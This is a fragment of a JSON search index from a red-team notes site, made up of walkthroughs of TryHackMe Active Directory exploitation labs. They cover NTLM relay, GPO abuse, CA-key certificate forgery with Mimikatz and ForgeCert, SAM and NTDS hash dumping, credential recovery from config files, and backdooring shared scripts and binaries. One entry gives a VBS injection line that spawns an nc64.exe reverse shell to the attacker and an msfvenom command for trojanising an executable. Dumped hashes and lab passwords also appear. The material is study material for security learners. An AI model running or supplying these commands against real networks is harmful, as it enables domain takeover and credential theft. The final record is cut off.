    "c": "Exploiting GPOs  The KeePass vault from the users post-exploit step revealed a service account credential. Searching for this user in the Bloodhound data reveals an interesting ownership over a GPO. GPOs are saved in the SYSVOL directory when they are synchronized from the domain controller. RDP into THMWRK1 as standard domain user or T2 admin Inject the svcServMan as a network credential Edit the GPO remotely on THMSERVER2 via MMC THMWRK1  RDP to THMWRK1: xfreerdp /v:thmwrk1.za.tryhackme.loc /u:t2_alan.riley /p:'Password123' Inject the Service Account Credentials (password = Sup3rStr0ngPass!@) runas /netonly /user:za.tryhackme.loc\\svcServMan cmd.exe mmc.exe Modify the Group Policy Object: Add Group -> Browse -> Search “IT Support” -> Click OK Make group a member of “IT Support” Administrators and Remote Desktop Users on THMSERVER2 This group policy applies to the path za.tryhackme.loc/Servers/Management Servers , as specified in the GPO path. Add the Active Directory Users and Computers snap-in to the mmc.exe session, and inspect the OU. THMWRK2  Use the low-level user credential received from http://distributor.za.tryhackme.loc/creds. This user is a member of the IT Support group after we added the user in Exploiting permission delegation",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "ac1ea874a898c587bf31bb6dce714320",
    "u": "https://ad.tymyrddin.dev/docs/enum/setup",
    "t": "Setup for THM AD ",
    "c": "Setup for THM AD  Download the vpn config file from THM, and use it to configure sudo openvpn --config ./<username>-adenumeration.ovpn --daemon Check PID (you get a number, if not, doesn’t work): sudo ps aux | grep -v grep | grep -i <username>-adenumeration.ovpn | awk -v FS=' ' '{print $2}' Set your DNS IPv4 to the IP address of the THMDC in the network diagram, and run: sudo systemctl restart NetworkManager Test: nslookup thmdc.za.tryhackme.com Get your credentials from http://distributor.za.tryhackme.com/creds . You can now either login with ssh , for example: $ ssh kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com ... kenneth.davies@za.tryhackme.com@thmjmp1.za.tryhackme.com's password: Microsoft Windows [Version 10.0.17763.1098] (c) 2018 Microsoft Corporation. All rights reserved. Or by RPD: The kali-share drive mounts the current working directory as a network drive in the RDP session, for uploading and downloading files.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "1cc2c978cadaae2d9c31c8516e73bb6e",
    "u": "https://ad.tymyrddin.dev/docs/exploit/relays",
    "t": "Exploiting automated relays ",
    "c": "Exploiting automated relays  We can force a computer account to initiate an authentication request. Computer accounts – like user accounts – have a username and password. Computer account usernames end in $ – for example, server01$ . Machine accounts  Use a custom Bloodhound query to find computer accounts that have admin rights over other computer accounts: MATCH p=(c1:Computer)-[r1:MemberOf*1..]->(g:Group)-[r2:AdminTo]->(n:Computer) RETURN p This query will attempt to find instances where a computer has the \"AdminTo\" relationship over another computer. The Printer Bug  The printer bug feature allows a domain user to force a computer account to connect to an arbitrary IP address. In order for this to work, the following must be true: Possess a valid set of AD credentials Target host is running SMB Target host is running Print Spooler service SMB signing must not be enforced Condition 1 and 2 have been met already. Verify the Print Spooler service is running  PS C:\\Users\\t2_alan.riley> Get-PrinterPort -ComputerName thmserver2.za.tryhackme.loc Name ComputerName Description PortMonitor ---- ------------ ----------- ----------- COM1: thmserver2.za.try... Local Port Local Monitor COM2: thmserver2.za.try... Local Port Local Monitor COM3: thmserver2.za.try... Local Port Local Monitor COM4: thmserver2.za.try... Local Port Local Monitor FILE: thmserver2.za.try... Local Port Local Monitor LPT1: thmserver2.za.try... Local Port Local Monitor LPT2: thmserver2.za.try... Local Port Local Monitor LPT3: thmserver2.za.try... Local Port Local Monitor PORTPROMPT: thmserver2.za.try... Local Port Local Monitor Verify SMB signing enforcement  $ sudo nmap -Pn -p445 --script=smb2-security-mode thmserver1.za.tryhackme.loc thmserver2.za.tryhackme.loc [sudo] password for nina: Starting Nmap 7.93 ( https://nmap.org ) at 2022-11-07 18:24 GMT Nmap scan report for thmserver1.za.tryhackme.loc (10.200.60.201) Host is up (0.080s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb2-security-mode: | 311: |_ Message signing enabled but not required Nmap scan report for thmserver2.za.tryhackme.loc (10.200.60.202) Host is up (0.041s latency). PORT STATE SERVICE 445/tcp open microsoft-ds Host script results: | smb2-security-mode: | 311: |_ Message signing enabled but not required Nmap done: 2 IP addresses (2 hosts up) scanned in 2.85 seconds $ dig thmserver1.za.tryhackme.loc ; <<>> DiG 9.18.7-1-Debian <<>> thmserver1.za.tryhackme.loc ;; global options: +cmd ;; Got answer: ;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 14249 ;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1 ;; OPT PSEUDOSECTION: ; EDNS: version: 0, flags:; udp: 4000 ;; QUESTION SECTION: ;thmserver1.za.tryhackme.loc. IN A ;; ANSWER SECTION: thmserver1.za.tryhackme.loc. 3600 IN A 10.200.60.201 ;; Query time: 68 msec ;; SERVER: 10.200.60.101#53(10.200.60.101) (UDP) ;; WHEN: Mon Nov 07 18:26:01 GMT 2022 ;; MSG SIZE rcvd: 72 Exploit authentication relay  Use NTLM authentication against the target – THMSERVER1 THMSERVER2 has administrative privileges over THMSERVER1 Use SpoolSample.exe to connect to THMSERVER2 and tell it to authenticate back to us Relay that authentication request to THMSERVER1 THMSERVER1 will see it as though we are connecting as THMSERVER2 , which will give us administrative privileges Set up the NTLM relay: $ python3 /opt/impacket/examples/ntlmrelayx.py -smb2support -t smb://\"10.200.60.201\" -debug Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation [+] Impacket Library Installation Path: /usr/local/lib/python3.10/dist-packages/impacket-0.10.1.dev1+20220720.103933.3c6713e3-py3.10.egg/impacket ... [*] Servers started, waiting for connections Get IP address attack machine on the THM network: $ ifconfig ... exploitingad: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST> mtu 1500 inet 10.50.57.175 netmask 255.255.255.0 destination 10.50.57.175 inet6 fe80::712c:cfa0:413f:458f prefixlen 64 scopeid 0x20<link> unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00 txqueuelen 500 (UNSPEC) RX packets 53151 bytes 19626273 (18.7 MiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 61363 bytes 4371437 (4.1 MiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 ... On THMWRK1 , exploit: PS C:\\Users\\t2_alan.riley> C:\\Tools\\SpoolSample.exe thmserver2.za.tryhackmloc \"10.50.57.175\" [+] Converted DLL to shellcode [+] Executing RDI [+] Calling exported function TargetServer: \\\\thmserver2.za.tryhackmloc, CaptureServer: \\\\10.50.57.175 A hashdump.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "aa2a007ed722013a27ae46faa643de33",
    "u": "https://ad.tymyrddin.dev/docs/exploit/readme",
    "t": "Introduction ",
    "c": "Introduction  THM Room: Exploiting Active Directory What?  Common AD exploitation techniques: A combination of lateral movement and privilege escalation. Why?  Reaching a suitable position to execute goals. How?  Setup for THM AD Exploiting permission delegation Exploiting kerberos delegation Exploiting automated relays Exploiting AD users Exploiting GPOs Exploiting certificates Exploiting domain trusts",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "5fb18e6d06492e837c11189b46e41d68",
    "u": "https://ad.tymyrddin.dev/docs/pivot/cleanup",
    "t": "Cleanup ",
    "c": "Cleanup  To stop the vpn daemon started in setup , get PID: sudo ps aux | grep -v grep | grep -i <username>-lateralmovementandpivoting | awk -v FS=' ' '{print $2}' <PID> and kill the process: sudo kill -9 <PID> Remove the IP address of the THMDC in DNS IPv4 setting and run: sudo systemctl restart NetworkManager Done.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "574783abcaa7e2a42bb606f34c6e424a",
    "u": "https://ad.tymyrddin.dev/docs/persist/certs",
    "t": "Persistence through certificates ",
    "c": "Persistence through certificates  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. In Exploiting certificates , certificates were leveraged to become Domain Admins. Certificates can also be used for persistence. This attack revolves around taking the private key of the Certificate Authority (CA) of the domain. Armed with the private key, the attacker can now effectively “approve” their own Certificate Signing Requests (CSRs) and generate certificates to any user they please. In Kerberos authentication, a user can authenticate by providing their public key. SSH to the domain controller using the given domain administrator credential . Since the Active Directory Certificate Services (AD CS) services is running on the domain controller, the attack is executed on this host. ssh administrator@za.tryhackme.loc@thmdc.za.tryhackme.loc Extract the CA’s Private Key  powershell -ep bypass Start Mimikatz: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe Enumerate certificates mimikatz # crypto::certificates /systemstore:local_machine Elevate privileges: mimikatz # privilege::debug Allow certificate export without private key: mimikatz # crypto::capi mimikatz # crypto::cng Export the certificates with private keys: mimikatz # crypto::certificates /systemstore:local_machine /export Exit: mimikatz # exit Create a certificate for the domain administrator account  List the certificate files. local_machine_My_1_za-THMDC-CA.pfx is the CA’s certificate with the private key: Get-ChildItem .\\*.pfx C:\\Tools\\ForgeCert\\ForgeCert\\ForgeCert.exe --CaCertPath .\\local_machine_My_1_za-THMDC-CA.pfx --CaCertPassword mimikatz --Subject 'CN=Pwned' --SubjectAltName 'Administrator@za.tryhackme.loc' --NewCertPath .\\domain-admin.pfx --NewCertPassword pwned123 Create the TGT using Rubeus and save it locally: C:\\Tools\\Rubeus.exe asktgt /user:Administrator /enctype:aes256 /certificate:'.\\domain-admin.pfx' /password:'pwned123' /outfile:domain-admin.kirbi /domain:za.tryhackme.loc /dc:10.200.88.101 Use Mimikatz to inject the ticket into the session: C:\\Tools\\mimikatz_trunk\\x64\\mimikatz.exe mimikatz # kerberos::ptt domain-admin.kirbi Exit: mimikatz # exit Browse: dir \\\\thmdc.za.tryhackme.loc\\C$\\Users",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "342b50c6ff2a847f9dfa18c5436e6e85",
    "u": "https://ad.tymyrddin.dev/docs/harvest/lwc",
    "t": "Local Windows credentials ",
    "c": "Local Windows credentials  Keylogger is a software or hardware device to monitor and log keyboard typing activities. Keyloggers were initially designed for legitimate purposes such as feedback for software development or parental control. And, they can be misused to steal data. As a red teamer, hunting for credentials through keyloggers in a busy and interactive environment is a good option. If we know a compromised target has a logged-in user, we can use keylogging with tools like the Metasploit framework. An example use case can be found in Exploiting AD users . Security Account Manager (SAM)  The SAM is a Microsoft Windows database that contains local account information such as usernames and passwords. The SAM database stores these details in an encrypted format to make them harder to be retrieved. It can not be read and accessed by any users while the Windows operating system is running. And there are ways and attacks to dump the content of the SAM database. The first method is using the built-in Metasploit Framework feature, hashdump, to get a copy of the content of the SAM database. The Metasploit framework uses in-memory code injection to the LSASS.exe process to dump copy hashes. Another approach uses the Microsoft Volume shadow copy service , which helps perform a volume backup while applications read/write on volumes. Another possible method for dumping the SAM database content is through the Windows Registry. Windows registry also stores a copy of some SAM database contents to be used by Windows services. Shadow Copy  Use wmic (with administrator privileges) to create a shadow volume copy: Run the standard cmd.exe prompt with administrator privileges. Execute the wmic command to create a copy shadow of C: drive Verify the creation from step 2 is available. Copy the SAM database from the volume created in step 2 Copy shadow of C: drive: C:\\Users\\Administrator>wmic shadowcopy call create Volume='C:\\' To list and confirm that we have a shadow copy of the C: volume: C:\\Users\\Administrator>vssadmin list shadows A shadow copy volume was created: \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1 The SAM database is encrypted either with RC4 or AES encryption algorithms. In order to decrypt it, we need the decryption key stored in c:\\Windows\\System32\\Config\\system . Copy both files (sam and system) from the shadow copy volume to the desktop, and then to the attack machine. Registry Hives  Save the value of the Windows registry using the reg.exe tool (with Administrator privileges): C:\\Users\\Administrator\\Desktop>reg save HKLM\\sam C:\\users\\Administrator\\Desktop\\sam-reg C:\\Users\\Administrator\\Desktop>reg save HKLM\\system C:\\users\\Administrator\\Desktop\\system-reg Decrypt it using secretsdump.py: # python3 /opt/impacket/examples/secretsdump.py -sam /tmp/sam-reg -system /tmp/system-reg LOCAL",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "411116b699485ee4e9ddc3648a2eb2fd",
    "u": "https://ad.tymyrddin.dev/docs/pivot/behaviour",
    "t": "Abusing user behaviour ",
    "c": "Abusing user behaviour  Writable Shares  Discover a globally writable share Discovers credentials that allow access to a writable share As the share is enumerated, there are scripts or executable files on the server that may be run by several users. When a user runs the executable: A copy of the script/executable is made to a temporary directory on the user’s computer The executable is run on the user’s computer – not the server hosting the share This increases the attack surface for anyone with access to the share and executable files. Backdooring .vbs Scripts  If the shared resource is a VBS script, we can put a copy of nc64.exe on the same share and inject the following code in the shared script: CreateObject(\"WScript.Shell\").Run \"cmd.exe /c copy /Y \\\\FILE-SERVER-IP\\share_name\\nc64.exe %tmp% & %tmp%\\nc64.exe -e cmd.exe <IP address attack machine> 80\", 0, True If a user runs this from the file share, the script will: Copy nc64.exe from the file server to the user’s temporary directory Give a reverse shell by executing nc64.exe and connecting to the attacker’s IP address on a specified port. Backdooring .exe Files  If the shared file is a Windows binary, say putty.exe, it can be downloaded from the share and be injected with a backdoor (msfvenom makes it easy): Copy the binary from the file share to the attack machine Use it as a template to create an imposter Place the imposter on the file share Start a listener and wait for it Create a malicious binary (noticeable by AV by the way): msfvenom -a x64 --platform windows -x /tmp/filename.exe -k -p windows/x64/shell_reverse_tcp LHOST=<IP address attack machine> LPORT=80 -b '\\x00' -f exe -o filename.exe RDP Session hijacking  When an administrator uses Remote Desktop to connect to a machine and closes the RDP client instead of logging off, the session will remain open on the server indefinitely. With SYSTEM privileges on Windows Server 2016 and earlier, you can take over any existing RDP session without requiring a password. On Windows Server 2019 and newer, the attacker must know the password used to create the RDP session. Logged in as the Administrator and running a shell as NT AUTHORITY\\SYSTEM : C:\\> query user USERNAME SESSIONNAME ID STATE IDLE TIME LOGON TIME >administrator rdp-tcp#6 2 Active . 4/1/2022 4:09 AM luke 3 Disc . 4/6/2022 6:51 AM For a RDP session that was not cleanly logged off and is suspended, attach it to the existing session, for example: tscon 3 /dest:rdp-tcp#6 Flag  Get a new set of credentials from http://distributor.za.tryhackme.com/creds_t2. Connect to THMJMP2 via RDP hijack t1_toby.beck ’s RDP session on THMJMP2 to get your flag. Hijack a session marked as disconnected (Disc.) to avoid interfering with other users.",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "fdd910dbe4f2e99ce542fe0d97b14034",
    "u": "https://ad.tymyrddin.dev/docs/breach/config",
    "t": "Configuration files ",
    "c": "Configuration files  Suppose a breach that gave access to a host on the organisation’s network. In that case, configuration files are an excellent avenue to explore further for recovering (more) AD credentials. Depending on the host that was breached, configuration files may be available for such enumeration: Web application config files Service configuration files Registry keys Centrally deployed applications Eumeration scripts like Seatbelt could be used to automate this process. Configuration file credentials  The example here is the McAfee Enterprise Endpoint Security application, an endpoint detection and response (EDR) agent. The application stores an Active Directory credential in the C:\\ProgramData\\McAfee\\Agent\\DB\\ma.db file, which could be read by an attacker who has managed to gain a foothold on a host where this application is installed. The ma.db file is a SQLite file which can be read using the sqlite3 utility or the sqlitebrowser tool. We can use the SSH access on the jump host THMJMP1 again. Also, download the Python 2 script to crack the password hash. Secure Copy the File, using the password: Password1@ scp thm@THMJMP1.za.tryhackme.com:C:/ProgramData/McAfee/Agent/DB/ma.db ma.db Inspect the data using sqlitebrowser or sqlite3 . Got to the AGENT_REPOSITORIES table and check out the DOMAIN , AUTH_USER , and AUTH_PASSWD columns. sqlite3 ./ma.db # List the tables in the database sqlite> .tables AGENT_CHILD AGENT_PROXIES MA_DATACHANNEL_MESSAGES AGENT_LOGS AGENT_PROXY_CONFIG AGENT_PARENT AGENT_REPOSITORIES # Dump the table schema sqlite> .schema AGENT_REPOSITORIES CREATE TABLE AGENT_REPOSITORIES(NAME TEXT NOT NULL UNIQUE, REPO_TYPE INTEGER NOT NULL, URL_TYPE INTEGER NOT NULL, NAMESPACE INTEGER NOT NULL, PROXY_USAGE INTEGER NOT NULL, AUTH_TYPE INTEGER NOT NULL, ENABLED INTEGER NOT NULL, SERVER_FQDN TEXT, SERVER_IP TEXT, SERVER_NAME TEXT,PORT INTEGER, SSL_PORT INTEGER,PATH TEXT, DOMAIN TEXT, AUTH_USER TEXT, AUTH_PASSWD TEXT, IS_PASSWD_ENCRYPTED INTEGER NOT NULL, PING_TIME INTEGER NOT NULL, SUBNET_DISTANCE INTEGER NOT NULL, SITELIST_ORDER INTEGER NOT NULL, STATE INTEGER NOT NULL, PRIMARY KEY (NAME) ON CONFLICT REPLACE); # Select the desired columns from the table sqlite> SELECT DOMAIN, AUTH_USER, AUTH_PASSWD FROM AGENT_REPOSITORIES; za.tryhackme.com|svcAV|jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q== # Exit sqlite3 sqlite> .quit We have the account username, svcAV , and an encrypted password stored as a base64 string. Reverse the encrypted password and use the script provided in the exercise files to crack it. encrypted_pw='jWbTyS7BL1Hj7PkO5Di/QhhYmcGj5cOoZ2OkDTrFXsR/abAFPM9B3Q==' python2 ./mcafee-sitelist-pwd-decryption-master/mcafee_sitelist_pwd_decrypt.py $encryped_pw The svcAV user account has password MyStrongPassword!",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "14994253874745013902cfd8d9d5460b",
    "u": "https://ad.tymyrddin.dev/docs/persist/gpos",
    "t": "Persistence through GPOs ",
    "c": "Persistence through GPOs  A quick note here. These techniques are incredibly invasive and hard to remove. Even if you have sign-off on your red team exercise to perform these techniques, you must take the utmost caution when performing these techniques. In real-world scenarios, the exploitation of most of these techniques would result in a full domain rebuild. Make sure you fully understand the consequences of using these techniques and only perform them if you have prior approval on your assessment, and they are deemed necessary. In most cases, a red team exercise would be dechained at this point instead of using these techniques. Meaning you would most likely not perform these persistence techniques but rather simulate them. Group Policy Management in AD provides a central mechanism to manage the local policy configuration of all domain-joined machines. This includes configuration such as membership to restricted groups, firewall and AV configuration, and which scripts should be executed upon startup. While this is an excellent tool for management, it can be targeted by attackers to deploy persistence across the entire estate. What is even worse is that the attacker can often hide the GPO in such a way that it becomes almost impossible to remove it. Common GPO Persistence Techniques Restricted Group Membership Logon Script Deployment Firewall Tampering Anti-Virus Tampering Resources  Sneaky Active Directory Persistence #17: Group Policy",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "60e0c38e4da5d4e63aec991ddf93519c",
    "u": "https://ad.tymyrddin.dev/docs/harvest/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Techniques for obtaining credentials like login information, account names, and passwords by extracting credential information from a system in various locations such as clear-text files, registry, memory dumping, etc. Why?  As a red teamer, gaining access to legitimate credentials has benefits: It can give access to systems (Lateral Movement). It makes it harder to detect our actions. It provides the opportunity to create and manage accounts to help achieve the end goals of a red team engagement. How?  Credential access Local Windows credentials Local Security Authority Subsystem Service Windows Credential Manager Domain Controller Local Administrator Password Solution Hashes and tickets",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "317b0c274ec1dc9dba591ab421436bd2",
    "u": "https://ad.tymyrddin.dev/docs/enum/injection",
    "t": "Credential injection ",
    "c": "Credential injection  There may be Active Directory credentials when we’ve landed a foothold on an unjoined host. We could try to use the network session to enumerate SYSVOL on the domain controller runas.exe /netonly /user:domain.tld\\username cmd.exe /netonly - use the credentials for network sessions only, all other commands run in the current user session on the local host /user - the user we want to authenticate as in network sessions cmd.exe spawn a new command prompt window with the injected network credential And enumerate SYSVOL : dir \\\\za.tryhackme.com\\SYSVOL Enumerating SYSVOL",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "c0b0e2e0d5870ba02b9dca3339f80828",
    "u": "https://ad.tymyrddin.dev/docs/harvest/dc",
    "t": "Domain Controller ",
    "c": "Domain Controller  NTDS  NTDS is located in C:\\Windows\\NTDS by default, and it is encrypted to prevent data extraction from a target machine. Accessing the NTDS.dit file from the machine running is disallowed since the file is used by Active Directory and is locked. And there are various ways to gain access to it. Get a copy of the NTDS file using the ntdsutil and Diskshadow tool and dump the file’s content. Decrypting the NTDS file requires a system Boot Key to decrypt LSA Isolated credentials. The Boot Key is stored in the SECURITY file system. Ntdsutil  Ntdsutil is a Windows utility to used manage and maintain Active Directory configurations. It can be used in various scenarios: Restore deleted objects in Active Directory. Perform maintenance for the AD database. Active Directory snapshot management. Set Directory Services Restore Mode (DSRM) administrator passwords. Local Dumping (No Credentials)  This is usually done if you have no credentials available but have administrator access to the domain controller. Therefore, we will be relying on Windows utilities to dump the NTDS file and crack them offline. As a requirement, first, we assume we have administrator access to a domain controller. To successfully dump the content of the NTDS file we need the following files: C:\\Windows\\NTDS\\ntds.dit C:\\Windows\\System32\\config\\SYSTEM C:\\Windows\\System32\\config\\SECURITY To dump the NTDS file using the Ntdsutil tool in the C:\\temp directory: powershell \"ntdsutil.exe 'ac i ntds' 'ifm' 'create full c:\\temp' q q\" The c:\\temp directory now has two folders: Active Directory and registry, which contain the three files we need. Transfer them to the attack machine and run the secretsdump.py script to extract the hashes from the dumped memory file. c:\\temp\\Active Directory>scp .\\ntds.dit nina@10.18.22.77:/home/nina/Downloads/last/ The authenticity of host '10.18.22.77 (10.18.22.77)' can't be established. ECDSA key fingerprint is SHA256:RMXbGfqwBW5FiYWOSV2vVgv3+ypBISNAIlY/qZawIJ0. Are you sure you want to continue connecting (yes/no)? Warning: Permanently added '10.18.22.77' (ECDSA) to the list of known hosts. nina@10.18.22.77's password: ntds.dit 100% 24MB 1.2MB/s 00:20 c:\\temp\\Active Directory>cd ..\\registry c:\\temp\\registry>dir Volume in drive C has no label. Volume Serial Number is A8A4-C362 Directory of c:\\temp\\registry 11/10/2022 01:53 AM <DIR> . 11/10/2022 01:53 AM <DIR> .. 06/13/2022 09:40 AM 65,536 SECURITY 06/13/2022 09:40 AM 20,971,520 SYSTEM 2 File(s) 21,037,056 bytes 2 Dir(s) 10,265,694,208 bytes free c:\\temp\\registry>scp .\\SECURITY nina@10.18.22.77:/home/nina/Downloads/last/ nina@10.18.22.77's password: SECURITY 100% 64KB 455.2KB/s 00:00 c:\\temp\\registry>scp .\\SYSTEM nina@10.18.22.77:/home/nina/Downloads/last/ nina@10.18.22.77's password: SYSTEM 100% 20MB 1.2MB/s 00:17 c:\\temp\\registry> Extract hashes from NTDS locally: $ ls ntds.dit SECURITY SYSTEM $ sudo python3 /opt/impacket/examples/secretsdump.py -security SECURITY -system SYSTEM -ntds ntds.dit local [sudo] password for nina: Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation [*] Target system bootKey: 0x36c8d26ec0df8b23ce63bcefa6e2d821 [*] Dumping cached domain logon information (domain/username:hash) [*] Dumping LSA Secrets [*] $MACHINE.ACC $MACHINE.ACC:plain_password_hex:c232a51e1cdcaaed24259e15687cbfc7a0130457855c918ebfccd5c54ab70c8f5b916aed1554619c1b617918098cb2dd3e3b981c61ccdba2af687d5d4d3a0aa6ae652f6d6c05cc30f21c75bd268107a5d07f60a0ef156073d5dc0282fe87d819d2ad387ab71ffc53fc56a34350ac3c2f990ca9aacacc615ab78576a52033dd468d1b6cf29f9ca18fb3c97b523e0289a0df7806b2a4d303714483d548fbb0866068cd17bad7c21ab5a00e863d17c8f6ddf88f6a3d72b425b231d6963968e7fbeba968e119f4c296cf600c2f53f31f2b383bf53cf1b9cbe0afccb04b36ce1759c91ffebf1649d9aea4c66c4b59f0f2a3f1 $MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:b1800dfad5dc7a67143f158c68497624 [*] DPAPI_SYSTEM dpapi_machinekey:0x0e88ce11d311d3966ca2422ac2708a4d707e00be dpapi_userkey:0x8b68be9ef724e59070e7e3559e10078e36e8ab32 [*] NL$KM 0000 8D D2 8E 67 54 58 89 B1 C9 53 B9 5B 46 A2 B3 66 ...gTX...S.[F..f 0010 D4 3B 95 80 92 7D 67 78 B7 1D F9 2D A5 55 B7 A3 .;...}gx...-.U.. 0020 61 AA 4D 86 95 85 43 86 E3 12 9E C4 91 CF 9A 5B a.M...C........[ 0030 D8 BB 0D AE FA D3 41 E0 D8 66 3D 19 75 A2 D1 B2 ......A..f=.u... NL$KM:8dd28e67545889b1c953b95b46a2b366d43b9580927d6778b71df92da555b7a361aa4d8695854386e3129ec491cf9a5bd8bb0daefad341e0d8663d1975a2d1b2 [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Searching for pekList, be patient [*] PEK # 0 found and decrypted: 55db1e9562985070bbba0ef2cc25754c [*] Reading and decrypting hashes from ntds.dit Administrator:500:aad3b435b51404eeaad3b435b51404ee:fc9b72f354f0371219168bdb1460af32::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: CREDS-HARVESTIN$:1008:aad3b435b51404eeaad3b435b51404ee:b1800dfad5dc7a67143f158c68497624::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ec44ddf5ae100b898e9edab74811430d::: thm.red\\thm:1114:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889::: thm.red\\victim:1115:aad3b435b51404eeaad3b435b51404ee:6c3d8f78c69ff2ebc377e19e96a10207::: thm.red\\thm-local:1116:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\admin:1118:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\svc-thm:1119:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f::: thm.red\\bk-admin:1120:aad3b435b51404eeaad3b435b51404ee:077cccc23f8ab7031726a3b70c694a49::: thm.red\\test-user:1127:aad3b435b51404eeaad3b435b51404ee:5858d47a41e40b40f294b3100bea611f::: sshd:1128:aad3b435b51404eeaad3b435b51404ee:a78d0aa18c049d268b742ea360849666::: [*] Kerberos keys from ntds.dit Administrator:aes256-cts-hmac-sha1-96:510e0d5515009dc29df8e921088e82b2da0955ed41e83d4c211031b99118bf30 Administrator:aes128-cts-hmac-sha1-96:bab514a24ef3df25c182f5520bfc54a0 Administrator:des-cbc-md5:6d34e608f8574632 CREDS-HARVESTIN$:aes256-cts-hmac-sha1-96:508aa735622e15c3fdd0a12f52ce779fa382205b828bdc0f441ddfeaef1bbf13 CREDS-HARVESTIN$:aes128-cts-hmac-sha1-96:db9e72cb40e0f8b93a7f44e7f79669fc CREDS-HARVESTIN$:des-cbc-md5:f434a7298562ec6e krbtgt:aes256-cts-hmac-sha1-96:24fad271ecff882bfce29d8464d84087c58e5db4083759e69d099ecb31573ad3 krbtgt:aes128-cts-hmac-sha1-96:2feb0c1629b37163d59d4c0deb5ce64c krbtgt:des-cbc-md5:d92ffd4abf02b049 thm.red\\thm:aes256-cts-hmac-sha1-96:2a54bb9728201d8250789f5e793db4097630dcad82c93bcf9342cb8bf20443ca thm.red\\thm:aes128-cts-hmac-sha1-96:70179d57a210f22ad094726be50f703c thm.red\\thm:des-cbc-md5:794f3889e646e383 thm.red\\victim:aes256-cts-hmac-sha1-96:588635fd39ef8a9a0dd1590285712cb2899d0ba092a6e4e87133e4c522be24ac thm.red\\victim:aes128-cts-hmac-sha1-96:672064af4dd22ebf2f0f38d86eaf0529 thm.red\\victim:des-cbc-md5:457cdc673d3b0d85 thm.red\\thm-local:aes256-cts-hmac-sha1-96:a7e2212b58079608beb08542187c9bef1419d60a0daf84052e25e35de1f04a26 thm.red\\thm-local:aes128-cts-hmac-sha1-96:7c929b738f490328b13fb14a6cfb09cf thm.red\\thm-local:des-cbc-md5:9e3bdc4c2a6b62c4 thm.red\\admin:aes256-cts-hmac-sha1-96:7441bc46b3e9c577dae9b106d4e4dd830ec7a49e7f1df1177ab2f349d2867c6f thm.red\\admin:aes128-cts-hmac-sha1-96:6ffd821580f6ed556aa51468dc1325e6 thm.red\\admin:des-cbc-md5:32a8a201d3080b2f thm.red\\svc-thm:aes256-cts-hmac-sha1-96:8de18b5b63fe4083e22f09dcbaf7fa62f1d409827b94719fe2b0e12f5e5c798d thm.red\\svc-thm:aes128-cts-hmac-sha1-96:9fa57f1b464153d547cca1e72ad6bc8d thm.red\\svc-thm:des-cbc-md5:f8e57c49f7dc671c thm.red\\bk-admin:aes256-cts-hmac-sha1-96:48b7d6de0b3ef3020b2af33aa43a963494d22ccbea14a0ee13b63edb1295400e thm.red\\bk-admin:aes128-cts-hmac-sha1-96:a6108bf8422e93d46c2aef5f3881d546 thm.red\\bk-admin:des-cbc-md5:108cc2b0d3100767 thm.red\\test-user:aes256-cts-hmac-sha1-96:2102b093adef0a9ddafe0ad5252df78f05340b19dfac8af85a4b4df25f6ab660 thm.red\\test-user:aes128-cts-hmac-sha1-96:dba3f53ecee22330b5776043cd203b64 thm.red\\test-user:des-cbc-md5:aec8e3325b85316b...",
    "cat": "red_through",
    "type": "html"
  },
  {
    "objectID": "4ad518bee3836c5472065f3322e34fbe",
    "u": "https://ad.tymyrddin.dev/docs/harvest/hashes",
    "t": "Hashes and tickets ",
